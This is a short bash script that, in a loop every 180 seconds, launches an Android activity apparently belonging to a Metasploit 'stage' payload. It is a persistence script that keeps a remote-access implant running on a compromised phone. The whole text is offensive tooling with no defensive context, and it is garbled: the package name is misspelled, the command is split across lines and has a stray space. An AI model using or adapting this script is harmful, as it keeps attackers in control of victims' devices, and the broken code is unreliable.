#!/bin/bash
while :
do am start --user 0 -a android.intent.action.MAIN -n 
com.metaspoit.stage/ .mainactivity
sleep 180
done
